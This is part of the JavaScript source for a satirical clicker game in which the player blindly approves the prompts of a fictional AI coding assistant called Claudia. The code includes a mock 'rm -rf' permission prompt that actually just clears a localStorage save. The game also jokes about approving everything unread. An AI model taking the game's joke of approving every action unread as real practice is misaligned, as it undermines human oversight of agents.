  $('statsClose').addEventListener('click', () => setDrawer(false));
  drawerScrim.addEventListener('click', () => setDrawer(false));

  /* =====================================================================
     Ticker
     ===================================================================== */
  const tickerEl = $('ticker');
  let tickerLast = '';
  function rotateTicker() {
    const options = TICKER.map(f => f()).filter(t => t && t !== tickerLast);
    const text = pick(options);
    tickerEl.classList.add('fade');
    setTimeout(() => {
      tickerEl.textContent = text;
      tickerEl.classList.remove('fade', 'crawl');
      // Too long for the bar? Crawl it sideways like a news ticker instead of cutting it off.
      const over = tickerEl.scrollWidth - tickerEl.parentElement.clientWidth + 28;
      if (over > 0) {
        tickerEl.style.setProperty('--crawl', -over + 'px');
        tickerEl.style.setProperty('--crawl-time', Math.max(2, over / 40) + 's');
        void tickerEl.offsetWidth;
        tickerEl.classList.add('crawl');
      }
    }, 350);
    tickerLast = text;
  }

  /* =====================================================================
     Input
     ===================================================================== */
  yesKey.addEventListener('click', () => { sfx.unlock(); agree(1); });
  promptEl.addEventListener('click', e => {
    const b = e.target.closest('.opt');
    if (b && !b.disabled) { sfx.unlock(); agree(Number(b.dataset.opt)); }
  });

  termBody.addEventListener('click', e => {
    const head = e.target.closest('.l-think');
    if (!head || !head.nextElementSibling) return;
    const body = head.nextElementSibling;
    body.hidden = !body.hidden;
    head.classList.toggle('open', !body.hidden);
    if (!body.hidden) S.stats.thoughts++;
  });
  $('driveBtn').addEventListener('click', stopDriving);
  $('helpBtn').addEventListener('click', openIntro);
  $('helpBtn2').addEventListener('click', () => { setDrawer(false); openIntro(); });

  gridEl.addEventListener('click', e => {
    const m = e.target.closest('.mini');
    if (m) setActive(Number(m.dataset.idx));
  });
  viewBtn.addEventListener('click', () => { S.view = gridOn() ? 'focus' : 'grid'; renderView(); });
  inputForm.addEventListener('submit', e => {
    e.preventDefault();
    const text = cmdInput.value;
    cmdInput.value = '';
    if (!text.trim()) { cmdInput.blur(); return; }
    handleInput(text);
  });
  window.matchMedia('(max-width: 780px)').addEventListener('change', () => renderView());

  tabList.addEventListener('click', e => {
    const t = e.target.closest('.tab');
    if (t) setActive(Number(t.dataset.idx));
  });
  newSessionBtn.addEventListener('click', openSession);

  const AGREE_KEYS = { Enter: 1, ' ': 1, '1': 1, y: 1, Y: 1, '2': 2 };
  const NO_KEYS = { '3': 1, n: 1, N: 1, Escape: 1 };

  document.addEventListener('keydown', e => {
    if (e.metaKey || e.ctrlKey || e.altKey) return;
    const k = e.key;
    // Typing to Claudia: game keys don't apply. Esc leaves the input.
    if (e.target.matches && e.target.matches('input, textarea')) {
      if (k === 'Escape') {
        e.preventDefault();
        if (resultOpen()) hideResult();
        else e.target.blur();
      }
      return;
    }
    if (modalKeys) {
      if (modalKeys(k)) e.preventDefault();
      return;
    }
    if (drawerOpen() && k === 'Escape') { e.preventDefault(); setDrawer(false); return; }   // not a "No"
    if (resultOpen() && k === 'Escape') { e.preventDefault(); hideResult(); return; }
    if (k === 's' || k === 'S') { e.preventDefault(); setDrawer(!drawerOpen()); return; }
    if (k === '/') { e.preventDefault(); cmdInput.focus(); cmdInput.value = '/'; return; }
    if (k === '?') { e.preventDefault(); openIntro(); return; }
    if ((k === 'g' || k === 'G') && !viewBtn.disabled) { e.preventDefault(); viewBtn.click(); return; }
    if (k === '[' || k === ']') {
      e.preventDefault();
      setActive((activeIdx + (k === ']' ? 1 : sessions.length - 1)) % sessions.length);
      return;
    }
    if (k === 'j' || k === 'J') { e.preventDefault(); jumpToWaiting(); return; }
    if (!(k in AGREE_KEYS) && !(k in NO_KEYS)) return;
    // Enter/Space on store or settings buttons should press that button, not agree.
    const btn = e.target.closest && e.target.closest('button');
    if ((k === 'Enter' || k === ' ') && btn && btn !== yesKey && !btn.classList.contains('opt') && !btn.classList.contains('tab')) return;
    e.preventDefault();
    if (e.repeat) {
      if (k in AGREE_KEYS) S.stats.held++;    // holding Enter doesn't count. That's what the stapler is for.
      return;
    }
    sfx.unlock();
    agree(k in NO_KEYS ? 3 : AGREE_KEYS[k]);
  });
  // Space activates buttons on keyup; we already handled it on keydown.
  document.addEventListener('keyup', e => {
    if (e.key === ' ' && e.target.closest && e.target.closest('.yes-key, .opt')) e.preventDefault();
  });

  const qtyBtns = Array.from(document.querySelectorAll('[data-qty]'));
  function renderQty() {
    qtyBtns.forEach(b => b.setAttribute('aria-checked', String(b.dataset.qty === String(qty))));
  }
  qtyBtns.forEach(b => b.addEventListener('click', () => {
    qty = b.dataset.qty === 'max' ? 'max' : Number(b.dataset.qty);
    renderQty();
    renderGens();
  }));

  const soundBtn = $('soundBtn');
  const renderSound = () => { soundBtn.textContent = S.sound ? tr('Sound on') : tr('Sound off'); };
  soundBtn.addEventListener('click', () => {
    S.sound = !S.sound;
    sfx.unlock();
    renderSound();
    save();
  });

  const THEMES = ['light', 'dark', 'auto'];
  const themeBtn = $('themeBtn');
  function renderTheme() {
    document.documentElement.dataset.theme = S.theme;
    themeBtn.textContent = tr({ light: 'Theme: Light', dark: 'Theme: Dark', auto: 'Theme: Auto' }[S.theme]);
  }
  themeBtn.addEventListener('click', () => {
    S.theme = THEMES[(THEMES.indexOf(S.theme) + 1) % THEMES.length];
    renderTheme();
    save();
  });

  // Confirmed in-page (as a permission prompt, naturally): embedded viewers block window.confirm().
  $('wipeBtn').addEventListener('click', () => {
    setDrawer(false);
    const box = el('div', 'pbox',
      el('div', 'ptitle', tr('Bash command')),
      el('div', 'ptarget', '  rm -rf ~/.dont-ask-again/save.json'),
      el('div', 'pnote', tr('Wipes all progress, achievements and stats. Claudia will not remember you (it never did).')),
      el('div', 'pq', tr('Do you want to proceed?')));
    [['1', tr('Yes, wipe everything')], ['2', tr('No, keep my progress (esc)')]].forEach(([n, t]) => {
      const b = el('button', 'opt', span('car', ''), n + '. ' + t);
      b.addEventListener('click', () => (n === '1' ? wipeSave() : closeModal()));
      box.append(b);
    });
    openModal(box, k => {
      if (k === '1') { wipeSave(); return true; }
      if (k === '2' || k === 'Escape' || k === 'n' || k === 'N') { closeModal(); return true; }
      return false;   // Enter / Y do nothing here: wiping takes a deliberate "1"
    });
  });

  function wipeSave() {
    closeModal();
    try { localStorage.removeItem(SAVE_KEY); } catch (e) { /* ignore */ }
    const theme = S.theme, view = S.view;   // wiping progress shouldn't change how the page looks
    S = blankState();
    S.theme = theme;
    S.view = view;
    streak = 0;
    clickLog.length = 0;
    recompute();
    resetSessions();
    greet(false);
    resetSlots();
    renderAll();
    save();
  }

  /* =====================================================================
     Main loop
     ===================================================================== */
  let autoFrac = 0, displayTpm = 0;
  let lastWall = Date.now();
  let accStore = 0, accSlow = 0, accAuto = 0, accSave = 0;

  // Credit income for time the page couldn't run (closed tab, background tab).
  function creditAway(seconds, onLoad) {
    const secs = Math.min(OFFLINE_CAP_S, seconds);
    const tps = offlineTps();
    if (secs <= 0 || tps <= 0) return;
    const gain = tps * secs;
    earn(gain);
    S.stats.auto += Math.floor(D.aps * secs);
    if (secs >= 30) {
      S.stats.away++;
      logLine(line('l-sys', tr('● While you were away ({time}), Claudia generated {n} tokens. You approved all of it.', { time: duration(secs), n: fmt(gain) })));
      if (onLoad) toast(tr('Welcome back'), tr('Claudia shipped {n} tokens without you. Nobody noticed the difference.', { n: fmt(gain) }));
    }
  }

  function currentTpm(now) {
    while (clickLog.length && now - clickLog[0][0] > CLICK_WINDOW_MS) clickLog.shift();
    let manual = 0;
    for (const [, v] of clickLog) manual += v;
    return (livePassive + manual / (CLICK_WINDOW_MS / 1000)) * 60;
  }

  const tpmEl = $('tpm'), tpmSub = $('tpmSub'), bankEl = $('bank'), autoRateEl = $('autoRate'), termTitle = $('termTitle');
  const vibeFill = $('vibeFill'), vibeMultEl = $('vibeMult'), vibeLabelEl = $('vibeLabel');

  const narrow = window.matchMedia('(max-width: 780px)');
  function renderIncident() {
    const inc = S.incident;
    termEl.classList.toggle('incident', !!inc);
    if (inc) {
      const left = Math.max(0, Math.ceil(incidentAutoSeconds() - (Date.now() - inc.start) / 1000));
      const toGo = inc.need - inc.done;
      termTitle.textContent = narrow.matches
        ? '🔥 ' + tr('DOWN · {n} hotfixes to go', { n: toGo })
        : '🔥 ' + tr('PRODUCTION DOWN — approve {n} more hotfixes · automation at {pct}%', { n: toGo, pct: Math.round(D.incidentMult * 100) });
      autoRateEl.textContent = (narrow.matches ? tr('heals in {n}s', { n: left }) : tr('self-heals in {n}s', { n: left }));
    } else if (frenzyMult() > 1) {
      termTitle.textContent = '✨ ' + tr('Claudia is on a roll — everything ×{m}', { m: FRENZY_MULT });
      autoRateEl.textContent = tr('{n}s left', { n: Math.ceil((frenzyUntil - performance.now()) / 1000) });
    } else {
      termTitle.textContent = 'claudia-mux — ' + (S.sessions === 1 ? tr('1 session') : tr('{n} sessions', { n: S.sessions }));
      autoRateEl.textContent = D.aps > 0 ? tr('{n} auto-approvals/s', { n: fmt(D.aps, true) }) : '';
    }
    termEl.classList.toggle('frenzy', !inc && frenzyMult() > 1);
  }

  function frame() {
    const nowWall = Date.now(), now = performance.now();
    let dt = (nowWall - lastWall) / 1000;
    lastWall = nowWall;
    if (dt > 5) { creditAway(dt, false); dt = 0; }   // tab was hidden; catch up in one go

    if (dt > 0) {
      working = tickSessions(dt);
      livePassive = passiveTps(working) * frenzyMult();
      earn(livePassive * dt);
      autoFrac += D.aps * dt;
      const n = Math.floor(autoFrac);
      autoFrac -= n;
      S.stats.auto += n;
      pendingAuto += n;
      autoApprove(n);
      if (now - lastAccept > VIBE_WINDOW) streak = Math.max(0, streak - D.vibeDecay * dt);
      if (S.driving) {
        driveAcc = Math.min(driveAcc + dt * 1000, DRIVE_STEP_MS * 4);
        while (driveAcc >= DRIVE_STEP_MS) { driveAcc -= DRIVE_STEP_MS; driveStep(); }
      }
    }

    // Every frame: the numbers that should feel alive
    const target = currentTpm(now);
    displayTpm += (target - displayTpm) * Math.min(1, dt * 6);
    if (Math.abs(target - displayTpm) < 0.5) displayTpm = target;
    if (target > S.stats.peakTpm) S.stats.peakTpm = target;
    tpmEl.textContent = fmt(displayTpm);
    bankEl.textContent = fmt(S.tokens);
    vibeFill.style.width = Math.min(streak, VIBE_MAX) / VIBE_MAX * 100 + '%';
    vibeMultEl.textContent = '×' + vibeMult().toFixed(2);
    vibeLabelEl.textContent = vibeLabel();

    accStore += dt; accSlow += dt; accAuto += dt; accSave += dt;
    if (accAuto >= 0.35) { accAuto = 0; flushAutoLog(); }
    if (accStore >= 0.2) {
      accStore = 0;
      renderStore();
      renderTabs();
      renderDebt();
      renderIncident();
      tpmSub.textContent = tr('≈ {cost}/hr in API spend', { cost: money(displayTpm * 60 * USD_PER_TOKEN) });
    }
    if (accSlow >= 1) {
      maybeStartIncident(accSlow);
      maybeOfferDrive();
      runEvents();
      if (S.incident && Date.now() - S.incident.start > incidentAutoSeconds() * 1000) resolveIncident(false);
      accSlow = 0;
      checkAchievements();
      if (drawerOpen()) renderStats();
      renderRewrite();
    }
    if (accSave >= 10) { accSave = 0; save(); }
    requestAnimationFrame(frame);
  }

  document.addEventListener('visibilitychange', () => { if (document.hidden) save(); });
  window.addEventListener('pagehide', save);

  /* =====================================================================
     Boot
     ===================================================================== */
  function greet(returning) {
    logLine(
      line('l-sys', '✻ ' + (returning ? tr('Welcome back! Claudia has more ideas.') : tr('Welcome! Claudia has some ideas.'))),
      line('l-sys dim', '  cwd: ~/definitely-not-a-todo-app'),
      line('l-sys dim', '  ' + tr('Your job: burn tokens as fast as possible. Don\'t read anything. Just approve.'))
    );
  }

  function renderAll() {
    renderDriving();
    renderView();
    renderTabs();
    renderQty();
    renderSound();
    renderTheme();
    renderStore();
    renderDebt();
    renderIncident();
    renderAchievements();
    renderStats();
    renderRewrite();
  }

  // An incident that was open when you left got "fixed" while you were away.
  if (S.incident) { S.incident = null; lastIncidentEnd = Date.now(); }
  if (!S.runStart) S.runStart = runSnapshot();
  localizePage(document.body);
  $('langSlot').append(languagePicker('drawer'));
  // Outside the repo (e.g. a shared link) there's no game hub to go back to.
  if (!/\/games\/dont-ask-again\//.test(location.pathname)) $('backLink').hidden = true;
  recompute();
  resetSessions();
  scheduleEvents();
  greet(hadSave);
  if (hadSave) creditAway((Date.now() - S.lastSave) / 1000, true);
  resetSlots();
  renderAll();
  rotateTicker();
  setInterval(rotateTicker, 9000);
  requestAnimationFrame(frame);
  if (!S.introSeen && !window.__paceSim && !/[?&]nointro\b/.test(location.search)) openIntro();

  // Expected tokens/sec for a player clicking `cps` times a second (clicks also approve sessions).
  // Used by the pacing simulator in dev/pace-sim.mjs to decide what to buy.
  function incomeEstimate(cps) {
    const need = S.sessions / avgWorkSeconds();
    const w = S.sessions * Math.min(1, (D.aps + cps) / need);
    const passive = (D.aps * D.tpa + w * D.workTps) * parallelMult(w);
    const click = (BASE_TPA * D.clickMult * D.vibeTop * parallelMult(w) + D.clickShare * passive) * cps;
    return passive + click;
  }

  // Handy for debugging, headless tests, and the pacing simulator.
  window.DontAskAgain = {
    incomeEstimate, refactor, refactorCost, canRewrite, doRewrite, chooseFork, costOf, sessionCost, sessionCap,
    tierIndex, rewriteNeed, rewritePoints, offerOf, GENERATORS, UPGRADES, FORKS, TIERS,
    get decision() { return decision; },
    get state() { return S; }, get derived() { return D; },
    agree, buyGen, buyUpgrade, recompute, save, startIncident, slots,
    sessions, setActive, openSession, jumpToWaiting, get working() { return working; },
    spawnSpecial, handleInput, hideResult, makeQuestion, makeConflict, openIntro, startDriving, stopDriving, buildWrapped, showWrapped, TRAP_TURNS, GOLDEN_TURN, makePlan, startWork, renderView,
  };
})();
